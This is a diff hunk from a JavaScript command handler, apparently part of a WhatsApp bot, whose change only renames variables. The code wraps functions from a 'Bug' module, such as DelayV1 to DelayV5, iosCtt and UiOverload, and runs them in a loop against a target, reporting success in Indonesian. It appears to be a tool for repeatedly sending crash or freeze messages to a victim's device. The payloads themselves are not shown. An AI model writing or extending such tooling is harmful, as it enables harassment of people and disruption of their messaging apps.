@@ -40,19 +40,19 @@ export default {
 
     await reply(`*Success! Mengeksekusi fungsi ${namaFungsi} ke target sebanyak ${jumlah} kali...*`);
 
-    const DelayV1 = (t) => Bug.DelayV1(sock, t ?? target);
-    const DelayV2 = (t) => Bug.DelayV2(sock, t ?? target);
-    const DelayV3 = (t) => Bug.DelayV3(sock, t ?? target);
-    const DelayV4 = (t) => Bug.DelayV4(sock, t ?? target);
-    const DelayV5 = (t) => Bug.DelayV5(sock, t ?? target);
-    const DelayHard = (t) => Bug.DelayHard(sock, t ?? target);
-    const DelayGB = (t) => Bug.DelayGB(sock, t ?? target);
-    const blankclickgb = (t) => Bug.blankclickgb(sock, t ?? target);
-    const lahora = (t) => Bug.lahora(sock, t ?? target);
-    const iosCtt = (t) => Bug.iosCtt(sock, t ?? target);
-    const fiOSNew = (t, c) => Bug.fiOSNew(sock, t ?? target, c);
-    const UiOverload = (t) => Bug.UiOverload(sock, t ?? target);
-    const sleep = Bug.sleep;
+    const _DelayV1 = (t) => Bug.DelayV1(sock, t ?? target);
+    const _DelayV2 = (t) => Bug.DelayV2(sock, t ?? target);
+    const _DelayV3 = (t) => Bug.DelayV3(sock, t ?? target);
+    const _DelayV4 = (t) => Bug.DelayV4(sock, t ?? target);
+    const _DelayV5 = (t) => Bug.DelayV5(sock, t ?? target);
+    const _DelayHard = (t) => Bug.DelayHard(sock, t ?? target);
+    const _DelayGB = (t) => Bug.DelayGB(sock, t ?? target);
+    const _blankclickgb = (t) => Bug.blankclickgb(sock, t ?? target);
+    const _lahora = (t) => Bug.lahora(sock, t ?? target);
+    const _iosCtt = (t) => Bug.iosCtt(sock, t ?? target);
+    const _fiOSNew = (t, c) => Bug.fiOSNew(sock, t ?? target, c);
+    const _UiOverload = (t) => Bug.UiOverload(sock, t ?? target);
+    const _sleep = Bug.sleep;
 
     for (let i = 0; i < jumlah; i++) {
       try {
